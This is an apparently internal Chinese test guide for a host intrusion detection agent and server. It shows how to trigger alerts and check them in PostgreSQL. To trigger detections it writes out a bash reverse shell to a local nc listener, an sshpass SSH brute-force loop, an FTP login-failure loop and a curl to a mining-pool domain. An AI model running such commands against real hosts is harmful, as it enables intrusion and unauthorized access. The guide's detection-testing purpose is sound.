# Agent + Server 集成测试流程

本文档描述 Agent 与 hcids Server 联合运行的端到端测试流程：Agent 采集/检测数据 → 通过 gRPC 发送至 hcids → hcids 解析并写入 PostgreSQL → 查询数据库验证数据正确性。

---

## 一、概述

### 与 Standalone 模式的区别

| 对比项 | Standalone 模式 | 集成测试模式（本地 hcids） |
|--------|----------------|--------------------------|
| 服务端 | 不需要 | 需要本地启动 hcids |
| 数据库 | 不需要 | 需要本地 PostgreSQL |
| 数据输出 | stderr / 文件 | gRPC → hcids → PostgreSQL |
| 验证方式 | 查看终端日志 | SQL 查询本地数据库 |
| 适用场景 | 插件功能调试 | 完整数据链路验证 |



### 数据流

```
Agent                          hcids Server                    PostgreSQL
┌──────────┐  gRPC stream     ┌──────────────┐  GORM          ┌──────────┐
│ Collector │───────────────→ │ transfer.go  │──────────────→ │ asset_*  │
│ Baseline  │  PackagedData   │   mapper/    │  INSERT/UPSERT │ alert_*  │
│ Detector  │                 │  repository/ │                │ event_*  │
│ eBPF      │ ←─────────────  │              │                │ baseline │
└──────────┘  Command          └──────────────┘                └──────────┘
```

### 数据类型与数据库表对照

| 插件 | DataType | 数据库表 | 写入方式 | 备注 |
|------|----------|---------|---------|------|
| collector | 5050 | asset_process | UPSERT | server.yaml 已配置 |
| collector | 5051 | asset_port | UPSERT | server.yaml 已配置 |
| collector | 5052 | asset_account | UPSERT | server.yaml 已配置 |
| collector | 5054 | asset_system_service | UPSERT | server.yaml 已配置 |
| collector | 5055 | asset_software | UPSERT | server.yaml 已配置 |
| collector | 5056 | asset_container | UPSERT | server.yaml 已配置 |
| collector | 5057 | asset_env_suspicious | UPSERT | server.yaml 已配置 |
| collector | 5058 | asset_image | UPSERT | server.yaml 未配置，不会采集 |
| collector | 5059 | asset_image_package | UPSERT | server.yaml 未配置，不会采集 |
| collector | 5060 | asset_web_service | UPSERT | server.yaml 未配置，不会采集 |
| collector | 5061 | asset_database | UPSERT | server.yaml 未配置，不会采集 |
| collector | 5062 | asset_kmod | UPSERT | server.yaml 已配置 |
| ebpf_base_detector | 59 | event_execve | INSERT | 原始事件，数据量大，默认不持久化 |
| ebpf_base_detector | 60 | event_connect | INSERT | 原始事件，数据量大，默认不持久化 |
| ebpf_base_detector | 63 | event_dns | INSERT | 原始事件，数据量大，默认不持久化 |
| ebpf_base_detector | 64 | event_file | INSERT | 原始事件，数据量大，默认不持久化 |
| ebpf_base_detector | 6003 | alert_dangerous_command | INSERT | |
| ebpf_base_detector | 6006 | alert_privilege_escalation | INSERT | |
| ebpf_base_detector | 6004 | alert_reverse_shell | INSERT | |
| detector | 6001 | alert_brute_force | INSERT | |
| detector | 6002 | alert_brute_force | INSERT | |
| detector | 6005 | alert_abnormal_login | INSERT | |
| baseline | 8000 | baseline_check_result + baseline_check_detail | INSERT | |
| scanner | 6061 | alert_malware_scan | INSERT | |
| scanner | 6062 | alert_malware_scan | INSERT | |
| nids | 6007 | alert_network_attack | INSERT | |
| ebpf_base_detector | 6008 | alert_malicious_request | INSERT |
| ebpf_base_detector | 6009 | alert_file_integrity | INSERT |

---

## 二、环境准备

### 2.1 前置条件

- Linux 操作系统（Ubuntu/CentOS）
- Go 编译环境
- root 权限（Agent 运行需要）
- PostgreSQL 数据库(本地)
- 网络互通（Agent → hcids gRPC 端口 50051）

**可选依赖（按测试需求安装）**：

| 依赖 | 用途 | 安装命令 | 检查命令 |
|------|------|---------|---------|
| Nginx/httpd | Web 服务采集 + NIDS 网络攻击检测 | `apt install nginx` 或 `yum install httpd` | `systemctl is-active nginx` |
| Docker | 容器/镜像资产采集 | `apt install docker.io` | `docker info` |
| sshpass | SSH 暴力破解测试 | `apt install sshpass` | `which sshpass` |
| ClamAV | Scanner 恶意文件扫描 | `apt install clamav libclamav-dev` | `which clamscan` |
| DNS 解析 | 恶意请求检测 | - | `dig +short example.com` |

### 2.2 数据库准备

确保本地 PostgreSQL 可访问（用户名 `postgres`，密码 `root`），并创建数据库：

```bash
# 连接到本地 PostgreSQL
psql -h 127.0.0.1 -p 5432 -U postgres

# 创建数据库（如果不存在）
CREATE DATABASE soc;
```

> hcids 启动时会自动执行 AutoMigrate 创建所有表，无需手动建表。

### 2.3 修改 hcids 数据库配置

**重要**：`/opt/cloudsec/conf/server.yaml` 默认的数据库配置指向远程服务器，本地集成测试需修改为本地 PostgreSQL。

```bash
# 1. 备份原始配置
cp /opt/cloudsec/conf/server.yaml /opt/cloudsec/conf/server.yaml.bak

# 2. 修改 server.yaml 中的 database 部分
```

将 `database` 配置改为：

```yaml
database:
  host: 127.0.0.1
  port: 5432
  user: postgres
  password: "root"
  database: soc
```

> **测试完成后务必恢复原配置**：`cp /opt/cloudsec/conf/server.yaml.bak /opt/cloudsec/conf/server.yaml`

### 2.4 测试前清理数据

**每次执行集成测试前，必须先清理历史数据**，确保测试结果不受上次测试影响。

#### 清理测试文件残留

Agent 连接后会自动下发 Scanner 扫描任务（扫描 `/root`、`/etc`、`/var/www`），需先清除上次测试遗留的文件：

```bash
# 清理 EICAR 测试文件
rm -f /root/eicar_test.com /root/eicar_1.exe /root/eicar_2.sh

# 清理提权测试产物
rm -f /tmp/suid_test_id

# 清理文件完整性测试产物
rm -f /etc/cron.d/ebpf_test_cron
```

#### 清理数据库

**方式一：使用清理脚本（推荐）**

```bash
cd /home/work/goProject/src/company/agent

# 直接执行（使用默认连接参数：127.0.0.1 / postgres / root）
bash scripts/clean-test-db.sh

# 或通过环境变量覆盖连接参数
DB_HOST=192.168.1.100 DB_PASS=mypass bash scripts/clean-test-db.sh
```

脚本会自动检测表是否存在，逐个 TRUNCATE 并输出结果。

**方式二：手动执行 SQL**

```bash
PGPASSWORD=root psql -h 127.0.0.1 -p 5432 -U postgres -d soc
```

```sql
-- 清空 Collector 资产表
TRUNCATE TABLE asset_process, asset_port, asset_account, asset_system_service,
    asset_software, asset_kmod, asset_container, asset_image, asset_image_package,
    asset_web_service, asset_database, asset_env_suspicious CASCADE;

-- 清空 eBPF 事件表
TRUNCATE TABLE event_execve, event_connect, event_dns, event_file CASCADE;

-- 清空告警表
TRUNCATE TABLE alert_brute_force, alert_dangerous_command, alert_privilege_escalation,
    alert_reverse_shell, alert_abnormal_login, alert_malicious_request,
    alert_malware_scan, alert_network_attack, alert_file_integrity CASCADE;

-- 清空 Baseline 表
TRUNCATE TABLE baseline_check_detail, baseline_check_result CASCADE;

-- 清空 Agent 信息表
TRUNCATE TABLE agent_info CASCADE;
```

> **说明：** 使用 `TRUNCATE` 比 `DELETE` 更快，且会重置自增 ID。`CASCADE` 会同时清理有外键依赖的关联数据。如果表尚未创建，可跳过此步骤，hcids 启动后会自动建表。

---

## 三、启动服务

### 3.1 启动 hcids Server

打开 **Terminal A**，执行：

```bash
cd /opt/cloudsec
sudo ./bin/hcids -config conf/server.yaml
```

**参数说明：**

| 参数 | 说明 |
|------|------|
| `-config conf/server.yaml` | 指定配置文件，包含数据库连接、gRPC/HTTP 端口等 |

#### 启动成功判定

在 Terminal A 的输出中，**必须**看到以下日志行：

```
INFO  配置加载成功: grpc_port=50051, http_port=8081, log_level=info
INFO  gRPC Server 启动，监听端口 :50051
INFO  [HTTP] HTTP API Server 启动，监听端口 :8081
```

**判定规则**：
- 三行均出现 → 启动成功，gRPC 和 HTTP 服务就绪，进入 3.2 启动 Agent
- `数据库初始化失败` 错误 → 数据库连接异常，检查 2.2 数据库准备 和 2.5 配置中的数据库连接信息
- `listen tcp :50051: bind: address already in use` → 端口被占用，执行 `ss -tlnp | grep 50051` 查看占用进程

#### 日志位置

| 位置 | 说明 |
|------|------|
| Terminal A (stdout) | 实时输出，**主要观察位置** |

#### 快速验证

启动后可在另一终端确认服务可达：

```bash
# 检查 gRPC 端口
ss -tlnp | grep 50051

# 检查 HTTP API
curl -s http://localhost:8081/api/agents | python3 -m json.tool
```

### 3.2 启动 Agent

打开 **Terminal B**，执行：

```bash
cd /opt/cloudsec
sudo ./bin/agent -config agent.yaml -test
```

**参数说明：**

| 参数 | 说明 |
|------|------|
| `-config agent.yaml` | 指定配置文件，包含 server 地址、插件目录等 |
| `-test` | 测试模式，将 agent_id 固定为 `123456`，便于数据库查询。生产环境不使用此参数 |

#### 启动成功判定

在 Terminal B 的输出中，**必须**看到以下日志行：

```
INFO  Agent started successfully
INFO  Connected to server
INFO  Plugin loaded: collector
INFO  Plugin loaded: ebpf_base_detector
```

**判定规则**：
- `Connected to server` 出现 → Agent 与 hcids 连接成功
- `Plugin loaded: <插件名>` 出现 → 对应插件加载成功
- `transport: Error while dialing` 错误 → 连接 hcids 失败，检查 hcids 是否已启动、agent.yaml 中 server 地址是否正确
- `failed to load eBPF` 错误 → 内核不支持 eBPF，检查内核版本 >= 5.4 且存在 `/sys/kernel/btf/vmlinux`

#### 日志位置

| 位置 | 说明 |
|------|------|
| Terminal B (stdout/stderr) | 实时输出，**主要观察位置** |
| `/opt/cloudsec/logs/agent.log` | Agent 主程序日志持久化文件 |
| `/opt/cloudsec/logs/plugins/ebpf_base_detector/ebpf_base_detector.log` | eBPF 插件日志 |
| `/opt/cloudsec/logs/plugins/collector/collector.log` | Collector 插件日志 |

#### 搜索技巧

如果终端输出较多，可使用以下方式过滤：

```bash
# 方式一：启动时过滤关键日志
sudo ./bin/agent -config agent.yaml -test 2>&1 | grep -E "(Plugin loaded|Connected|ERROR)"

# 方式二：保存全部输出到文件，在另一个终端搜索
sudo ./bin/agent -config agent.yaml -test 2>&1 | tee /tmp/agent_integration_test.log
# Terminal C 中搜索
grep "ERROR" /tmp/agent_integration_test.log
grep "Plugin loaded" /tmp/agent_integration_test.log
```

### 3.3 验证连接

**方式一：查看 hcids 日志**

hcids 终端应出现 Agent 注册日志：
```
INFO  [Transfer] Agent 连接: agent_id=123456 hostname=xxx
```

**方式二：通过 HTTP API 查询**

```bash
# 查看在线 Agent 列表
curl -s http://localhost:8081/api/agents | python3 -m json.tool
```

**预期响应：**
```json
{
    "agents": [
        {
            "agent_id": "123456",
            "hostname": "your-hostname",
            "ipv4": ["192.168.x.x"],
            "version": "...",
            "product": "cloudsec-agent",
            "last_seen": "2026-03-01T..."
        }
    ],
    "total": 1
}
```

**方式三：查询数据库**

```bash
psql -h 127.0.0.1 -p 5432 -U postgres -d soc -c \
  "SELECT agent_id, host_name, host_ip, connection_status, last_connected_at FROM agent_info WHERE agent_id = '123456';"
```

`connection_status = 1` 表示 Agent 在线。

---

## 四、Collector 插件测试

Collector 插件在 Agent 连接 Server 后自动启动，按内置周期执行各 Handler 采集数据。

### 4.1 测试前准备

部分 Handler 需要系统中有对应服务运行才能采集到数据，**启动 Agent 前**需先准备好测试环境。

#### Web 服务采集（DataType 5060）— 需启动 Nginx 或 httpd

Collector 的 WebServiceHandler 通过扫描进程列表识别 `nginx`/`apache2`/`httpd` 进程，并解析配置文件提取版本、站点域名等信息。如果系统中没有运行 Web 服务器，该 Handler 不会产生数据。

```bash
# 方式一：启动 Nginx（推荐，大多数 Ubuntu/Debian 系统已安装）
sudo systemctl start nginx
# 验证
systemctl is-active nginx    # 应输出 active
curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/   # 应返回 200

# 方式二：启动 Apache httpd（CentOS/RHEL）
sudo systemctl start httpd
```

> **提示**：如果需要测试 `site_domain` 字段，可在 nginx 配置中添加 `server_name` 指令。Collector 会解析主配置及一级 `include` 文件中的域名。

#### 容器资产采集（DataType 5056）— 需启动容器

Collector 的 ContainerHandler 通过 Docker API 采集运行中的容器信息。如果没有运行中的容器，该 Handler 不会产生数据。

```bash
# 拉取 alpine 镜像并启动容器（轻量级，约 7MB）
docker pull alpine:latest
docker run -d --name test-alpine alpine:latest sleep 3600

# 验证容器正在运行
docker ps | grep test-alpine
```

> **说明**：启动容器后，ContainerHandler（5056）、ImageHandler（5058）、ImagePackageHandler（5059）均可采集到数据。`sleep 3600` 使容器保持运行 1 小时，足够完成测试。

### 4.2 等待自动采集

Agent 启动后，hcids 会自动下发插件配置，collector 插件启动后立即执行首轮采集。等待约 30 秒后即可查询数据库。

### 4.3 数据库验证

连接数据库后执行以下查询。所有资产表都以 `agent_id` 作为关联键。

```bash
# 连接数据库
PGPASSWORD=root psql -h 127.0.0.1 -p 5432 -U postgres -d soc
```

**进程 (asset_process)：**

```sql
-- 查看采集到的进程数量
SELECT COUNT(*) FROM asset_process WHERE agent_id = '123456';

-- 查看前 10 条记录
SELECT agent_id, host_ip, name, path, run_name, status, created_at
FROM asset_process WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 10;
```

验证要点：
- 记录数应与 `ps aux | wc -l` 大致一致
- `host_ip` 与 Agent 机器 IP 一致
- `name`、`path` 字段非空

**端口 (asset_port)：**

```sql
SELECT COUNT(*) FROM asset_port WHERE agent_id = '123456';

SELECT agent_id, host_ip, port, protocol, listen_ip, listen_process, run_user
FROM asset_port WHERE agent_id = '123456'
ORDER BY port;
```

验证要点：
- 与 `ss -tlnp` 对比，TCP 监听端口应一致
- `protocol` 6=TCP, 17=UDP
- `listen_process` 对应实际监听进程名

**用户 (asset_account)：**

```sql
SELECT COUNT(*) FROM asset_account WHERE agent_id = '123456';

SELECT agent_id, host_ip, name, uid, status, permission, login_type
FROM asset_account WHERE agent_id = '123456'
ORDER BY uid;
```

验证要点：
- 与 `/etc/passwd` 用户列表对比
- root 用户 uid=0 应存在

**系统服务 (asset_system_service)：**

```sql
SELECT COUNT(*) FROM asset_system_service WHERE agent_id = '123456';

SELECT name, status, run_user, path
FROM asset_system_service WHERE agent_id = '123456'
LIMIT 10;
```

验证要点：与 `systemctl list-units --type=service` 对比

**软件包 (asset_software)：**

```sql
SELECT COUNT(*) FROM asset_software WHERE agent_id = '123456';

SELECT name, version, type, source
FROM asset_software WHERE agent_id = '123456'
LIMIT 10;
```

验证要点：
- Debian/Ubuntu 与 `dpkg -l | wc -l` 对比
- RedHat/CentOS 与 `rpm -qa | wc -l` 对比

**内核模块 (asset_kmod)：**

```sql
SELECT COUNT(*) FROM asset_kmod WHERE agent_id = '123456';

SELECT name, size, refcount, used_by, state
FROM asset_kmod WHERE agent_id = '123456'
LIMIT 10;
```

验证要点：与 `lsmod | wc -l` 对比

**容器 (asset_container)** — 需先启动容器（参见 4.1）：

```sql
SELECT COUNT(*) FROM asset_container WHERE agent_id = '123456';

SELECT container_id, name, state, image_name, runtime
FROM asset_container WHERE agent_id = '123456';
```

验证要点：
- 与 `docker ps` 对比，运行中的容器应被采集
- 如果按 4.1 步骤启动了 test-alpine，应至少有 1 条记录
- `state` 为 `running`，`image_name` 包含 `alpine`

**镜像 (asset_image)** — 需要安装 Docker：

```sql
SELECT COUNT(*) FROM asset_image WHERE agent_id = '123456';

SELECT image_id, image_name, image_version, image_size
FROM asset_image WHERE agent_id = '123456';
```

验证要点：
- 与 `docker images` 对比
- `image_size` 非空（alpine 镜像约 7MB）

**Web 服务 (asset_web_service)** — 需先启动 Nginx 或 httpd（参见 4.1）：

```sql
SELECT COUNT(*) FROM asset_web_service WHERE agent_id = '123456';

SELECT name, version, server_type, site_domain, path, created_at
FROM asset_web_service WHERE agent_id = '123456';
```

验证要点：
- 如果按 4.1 步骤启动了 Nginx，应有 1 条记录
- `name` 为 `nginx`（或 `apache`），`version` 非空
- `path` 为配置文件路径（如 `/etc/nginx/nginx.conf`）
- `site_domain` 包含 nginx 配置中 `server_name` 指令的值（过滤 `_`、`localhost`、`*`）

---

## 五、ebpf_base_detector 插件测试 — 告警检测

ebpf_base_detector 插件随 Agent 启动后持续运行，通过 eBPF 监控系统行为。本节验证告警类检测功能，需要手动执行命令触发。

> 前提：内核版本 >= 5.x，存在 `/sys/kernel/btf/vmlinux`。

> **关于 event_* 表**：eBPF 原始事件（DataType 59/60/63/64 对应 event_execve/event_connect/event_dns/event_file）数据量极大，默认配置下 hcids 不会将这些原始事件持久化到数据库。集成测试中这些表为空是正常行为，只需关注告警表（alert_*）的数据。

### 5.1 高危命令检测 (DataType 6003)

在另一个终端执行测试命令：

```bash
# 终端 C：执行高危命令（2001 - 危险删除操作）
mkdir -p /tmp/test_dir && rm -rf /tmp/test_dir
```

等待 5-10 秒后查询数据库：

```sql
SELECT agent_id, host_ip, command, command_type, "user", alert_time, created_at
FROM alert_dangerous_command
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `command` 包含 `rm -rf /tmp/test_dir`
- `created_at` 为刚才执行的时间

### 5.2 本地提权检测 (DataType 6006)

参考 [privilege-escalation-testing.md](../standalone-test/privilege-escalation-testing.md) 中的方法触发提权事件后查询：

```sql
SELECT agent_id, host_ip, escalated_user, parent_process, process_path, discover_time
FROM alert_privilege_escalation
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

### 5.3 反弹 Shell 检测 (DataType 6004)

参考 [reverse-shell-testing.md](../standalone-test/reverse-shell-testing.md) 中的方法触发反弹 Shell 事件。

**快速触发示例**（需要两个终端）：

```bash
# 终端 D：监听端口
nc -lvp 9999

# 终端 C：触发反弹 Shell（测试后立即关闭）
bash -i >& /dev/tcp/127.0.0.1/9999 0>&1
```

等待 5-10 秒后查询数据库：

```sql
SELECT agent_id, host_name, victim_ip, command_line, shell_type,
       target_host, target_port, status, event_time
FROM alert_reverse_shell
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `target_host` 为 `127.0.0.1`
- `target_port` 为 `9999`
- `command_line` 包含反弹 Shell 命令

### 5.4 恶意请求检测 (DataType 6008)

参考 [malicious-requests-testing.md](../standalone-test/malicious-requests-testing.md) 中的方法触发恶意请求事件。

> **前提**：eBPF 恶意请求检测依赖 DNS 事件捕获，需确保环境 DNS 解析正常。先执行 `dig pool.minexmr.com` 或 `nslookup pool.minexmr.com` 验证 DNS 可用。如果 DNS 不通（例如 `systemd-resolved` 超时），此测试无法进行。

**快速触发示例**：

```bash
# 终端 C：先验证 DNS 是否正常
dig +short pool.minexmr.com
# 如果有返回 IP，说明 DNS 正常，继续执行：

# 访问已知挖矿域名（DNS 查询即触发，无需实际连通）
curl -s --connect-timeout 3 http://pool.minexmr.com > /dev/null 2>&1 || true
```

等待 5-10 秒后查询数据库：

```sql
SELECT agent_id, host_ip, policy_type, policy_name, malicious_domain,
       malicious_ip, request_count, first_request_time, last_request_time, status
FROM alert_malicious_request
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `malicious_domain` 包含访问的域名
- `policy_type` 标识匹配的威胁情报类型
- `request_count` >= 1

### 5.5 文件完整性告警 (DataType 6009)

eBPF 监控敏感文件的创建、修改、删除操作，匹配文件监控规则时产生告警。

**快速触发示例**（修改敏感文件）：

```bash
# 终端 C：向 crontab 目录写入测试文件（属于敏感路径）
echo "# test" > /etc/cron.d/ebpf_test_cron
rm /etc/cron.d/ebpf_test_cron
```

等待 5-10 秒后查询数据库：

```sql
SELECT agent_id, host_ip, rule_type, rule_name, threat_level, threat_action,
       file_path, file_name, operator_user, operator_process, alert_time
FROM alert_file_integrity
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `file_path` 包含 `/etc/cron.d/ebpf_test_cron`
- `threat_action` 为 `create` 或 `delete`
- `threat_level` 非空
- `operator_user` 为执行操作的用户

---

## 六、Detector 插件测试

Detector 插件通过监控系统日志文件检测暴力破解和异常登录。

### 6.1 SSH 暴力破解 (DataType 6001)

**注意：** 默认配置中 `127.0.0.1` 在白名单内，本地测试需先移除白名单。

**移除白名单方法**：编辑 `/opt/cloudsec/conf/server.yaml`，找到 `object_name: ssh` 对应的 task，将 `data` 字段中的 `"whitelist":["127.0.0.1","::1"]` 改为 `"whitelist":[]`，然后重启 hcids 和 Agent 使配置生效。

```bash
# 终端 C：模拟 SSH 密码错误（6 次以上触发）
# 注意：必须使用 sshpass 发送实际密码尝试，BatchMode=yes 不会产生 "Failed password" 日志
# 安装 sshpass: apt install sshpass
for i in {1..10}; do
  sshpass -p 'wrong_password' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 root@localhost 2>/dev/null
  sleep 1
done
```

> **为什么不能用 `ssh -o BatchMode=yes`？** 该模式下 SSH 客户端不会尝试密码认证，直接关闭连接，auth.log 中只会记录 `Connection closed by authenticating user`，不匹配检测规则的正则表达式 `Failed (password|publickey)`。

等待检测触发后（约 2 分钟）查询数据库：

```sql
SELECT agent_id, host_ip, source_ip, source_location, attack_type, username,
       attempt_count, first_attack_time, attack_time
FROM alert_brute_force
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

验证要点：
- `attack_type` 为 `ssh`
- `attempt_count` >= 6
- `source_ip` 为发起连接的 IP

### 6.2 FTP 暴力破解 (DataType 6002)

**前提：** 需安装 vsftpd。

```bash
# 模拟 FTP 登录失败
for i in {1..10}; do
  curl -u wronguser:wrongpass ftp://localhost/ 2>/dev/null
  sleep 1
done
```

```sql
SELECT agent_id, source_ip, attack_type, username, attempt_count, attack_time
FROM alert_brute_force
WHERE agent_id = '123456' AND attack_type = 'ftp'
ORDER BY created_at DESC LIMIT 5;
```

### 6.3 SSH 异常登录 (DataType 6005)

从非白名单 IP 成功登录 SSH 后查询：

```sql
SELECT agent_id, host_ip, source_ip, source_location, login_user, login_time, risk_level
FROM alert_abnormal_login
WHERE agent_id = '123456'
ORDER BY created_at DESC LIMIT 5;
```

---

## 七、Baseline 插件测试

Baseline 插件需要通过 HTTP API 手动下发基线检查任务（DataType 8000），不再自动触发。

### 7.1 前置条件

确保 `baseline_template` 和 `baseline_check_item` 表中已导入测试数据（模板+检查项）。如果是全新数据库，需要先插入测试模板和检查项数据。

**数据关联关系：**

```
baseline_template (模板)            baseline_check_item (检查项)
┌──────────────────────┐           ┌───────────────────────────────┐
│ id=1 Linux系统安全基线 │──┐       │ baseline_id=1, 检查SSH协议版本  │
│ item_count=3          │  ├─────→│ baseline_id=1, 检查密码最大天数  │
│                       │  │       │ baseline_id=1, 检查passwd权限   │
└──────────────────────┘  │       └───────────────────────────────┘
                          │
┌──────────────────────┐  │       ┌───────────────────────────────┐
│ id=2 SSH加固基线      │──┤       │ baseline_id=2, 禁止root远程登录 │
│ item_count=2          │  ├─────→│ baseline_id=2, SSH空闲超时检查   │
└──────────────────────┘  │       └───────────────────────────────┘
                          │
┌──────────────────────┐  │       ┌───────────────────────────────┐
│ id=3 文件完整性基线    │──┘       │ baseline_id=3, 检查/tmp是否存在 │
│ item_count=2          │  ──────→│ baseline_id=3, 检查hosts文件权限│
└──────────────────────┘          └───────────────────────────────┘
```

> `baseline_check_item.baseline_id` 关联 `baseline_template.id`，一个模板下有多个检查项。
> 下发任务时 `template_id` 指定使用哪个模板，服务端自动加载该模板下所有检查项。

**步骤一：插入测试模板（3 个模板）：**

```sql
-- 模板 1: Linux 系统安全基线（3 个检查项）
INSERT INTO baseline_template (id, baseline_name, baseline_type, os_type, version, item_count, description, is_enabled)
VALUES (1, 'Linux 系统安全基线', 'os_security', 'linux', '1.0', 3, 'Linux 系统安全合规检查（账户策略+文件权限+SSH）', 1);

-- 模板 2: SSH 加固基线（2 个检查项）
INSERT INTO baseline_template (id, baseline_name, baseline_type, os_type, version, item_count, description, is_enabled)
VALUES (2, 'SSH 加固基线', 'os_security', 'linux', '1.0', 2, 'SSH 服务安全加固检查', 1);

-- 模板 3: 文件完整性基线（2 个检查项）
INSERT INTO baseline_template (id, baseline_name, baseline_type, os_type, version, item_count, description, is_enabled)
VALUES (3, '文件完整性基线', 'os_security', 'linux', '1.0', 2, '关键文件存在性和权限检查', 1);
```

**步骤二：插入测试检查项（按模板分组，共 7 项）：**

检查项通过 `baseline_id` 关联所属模板，覆盖 agent 支持的主要检查类型。

```sql
-- ============================================================
-- 模板 1 的检查项（baseline_id=1，Linux 系统安全基线，共 3 项）
-- ============================================================

-- 1-1: command_check — 检查 SSH 协议版本
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (1, '确保SSH协议版本为2', '访问控制', 'high',
  '{"condition":"all","rules":[{"type":"command_check","param":["grep -i ''^Protocol'' /etc/ssh/sshd_config | awk ''{print $2}''"],"filter":"","require":"","result":"2"}]}',
  '编辑 /etc/ssh/sshd_config，设置 Protocol 2');

-- 1-2: file_line_check — 检查密码最大使用天数
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (1, '确保密码最大使用天数不超过90天', '账户策略', 'medium',
  '{"condition":"all","rules":[{"type":"file_line_check","param":["/etc/login.defs","PASS_MAX_DAYS"],"filter":"[0-9]+","require":"","result":"$(<=)90"}]}',
  '编辑 /etc/login.defs，设置 PASS_MAX_DAYS 90');

-- 1-3: file_permission — 检查 /etc/passwd 文件权限
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (1, '确保/etc/passwd权限为644或更严格', '文件权限', 'high',
  '{"condition":"all","rules":[{"type":"file_permission","param":["/etc/passwd"],"filter":"","require":"","result":"644"}]}',
  '执行 chmod 644 /etc/passwd');

-- ============================================================
-- 模板 2 的检查项（baseline_id=2，SSH 加固基线，共 2 项）
-- ============================================================

-- 2-1: command_check — 检查是否禁用root远程登录
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (2, '确保禁止root用户远程SSH登录', 'SSH加固', 'high',
  '{"condition":"all","rules":[{"type":"command_check","param":["grep -i ''^PermitRootLogin'' /etc/ssh/sshd_config | awk ''{print $2}''"],"filter":"","require":"","result":"no"}]}',
  '编辑 /etc/ssh/sshd_config，设置 PermitRootLogin no');

-- 2-2: command_check — 检查SSH空闲超时时间
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (2, '确保SSH空闲超时不超过300秒', 'SSH加固', 'medium',
  '{"condition":"all","rules":[{"type":"command_check","param":["grep -i ''^ClientAliveInterval'' /etc/ssh/sshd_config | awk ''{print $2}''"],"filter":"","require":"","result":"$(<=)300"}]}',
  '编辑 /etc/ssh/sshd_config，设置 ClientAliveInterval 300');

-- ============================================================
-- 模板 3 的检查项（baseline_id=3，文件完整性基线，共 2 项）
-- ============================================================

-- 3-1: if_file_exist — 检查 /tmp 目录是否存在
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (3, '确保/tmp目录存在', '文件完整性', 'low',
  '{"condition":"all","rules":[{"type":"if_file_exist","param":["/tmp"],"filter":"","require":"","result":true}]}',
  '执行 mkdir -p /tmp && chmod 1777 /tmp');

-- 3-2: file_permission — 检查 /etc/hosts 文件权限
INSERT INTO baseline_check_item (baseline_id, item_name, category, risk_level, check_rules, fix_suggestion)
VALUES (3, '确保/etc/hosts权限为644', '文件完整性', 'medium',
  '{"condition":"all","rules":[{"type":"file_permission","param":["/etc/hosts"],"filter":"","require":"","result":"644"}]}',
  '执行 chmod 644 /etc/hosts');
```

> **check_rules JSON 格式说明：**
> - `condition`：规则间逻辑关系，`all`=全部通过、`any`=任一通过、`none`=全不通过
> - `rules[].type`：检查类型，支持 `command_check`（命令输出）、`file_line_check`（文件行匹配）、`file_permission`（文件权限）、`if_file_exist`（文件存在）、`file_user_group`（文件属主）、`file_md5_check`（MD5校验）
> - `rules[].param`：参数数组，通常为命令或文件路径
> - `rules[].filter`：正则过滤器，从结果中提取子串
> - `rules[].result`：期望值，支持字符串精确匹配、正则匹配、关系运算符（`$(<=)90`、`$(>=)1`）

**步骤三：验证关联关系：**

```sql
-- 查看所有模板
SELECT id, baseline_name, baseline_type, item_count, is_enabled
FROM baseline_template ORDER BY id;

-- 查看每个模板下的检查项数量（应与 item_count 一致）
SELECT t.id AS template_id, t.baseline_name, t.item_count,
       COUNT(i.id) AS actual_items
FROM baseline_template t
LEFT JOIN baseline_check_item i ON i.baseline_id = t.id
GROUP BY t.id, t.baseline_name, t.item_count
ORDER BY t.id;

-- 查看所有检查项及其所属模板
SELECT i.id, i.baseline_id AS template_id, t.baseline_name AS template_name,
       i.item_name, i.category, i.risk_level
FROM baseline_check_item i
JOIN baseline_template t ON t.id = i.baseline_id
ORDER BY i.baseline_id, i.id;
```

预期结果为模板 1 有 3 项、模板 2 有 2 项、模板 3 有 2 项，共 7 个检查项。确认无误后即可进行下一步。

### 7.2 手动下发基线检查任务

通过 curl 调用 `POST /api/baseline/check` 下发任务：

```bash
curl -X POST http://127.0.0.1:8081/api/baseline/check \
  -H "Content-Type: application/json" \
  -d '{
    "agent_ids": ["<your_agent_id>"],
    "baseline_id": "test-task-001",
    "template_id": 1
  }'
```

参数说明：
- `agent_ids`：目标 agent 列表（必填）
- `baseline_id`：检测批次ID，即前端 task_id（string 类型）
- `template_id`：服务端基线模板 ID（必填，对应 `baseline_template.id`）

### 7.3 数据库验证

任务下发后等待 agent 执行完毕，查询数据库：

**基线检查结果：**

```sql
SELECT baseline_id, template_id, agent_id, host_ip, host_name,
       total_items, passed_items, failed_items, error_items, check_time
FROM baseline_check_result
WHERE agent_id = '<your_agent_id>'
ORDER BY created_at DESC LIMIT 5;
```

**检查项明细：**

```sql
SELECT d.result_id, d.item_id, d.item_name, d.agent_id,
       d.baseline_id, d.template_id, d.template_name,
       d.status, d.risk_level, d.actual_value, d.error_message
FROM baseline_check_detail d
WHERE d.agent_id = '<your_agent_id>'
ORDER BY d.created_at DESC LIMIT 20;
```

验证要点：
- `baseline_check_result` 有汇总记录，`total_items` > 0
- `baseline_check_result.baseline_id` 为下发时传入的 `"test-task-001"`（VARCHAR 类型）
- `baseline_check_result.template_id` 为下发时传入的模板 ID
- `baseline_check_detail` 有逐条检查明细
- `baseline_check_detail.template_name` 不为空（来自模板名称）
- `baseline_check_detail.template_id` 与 result 中一致
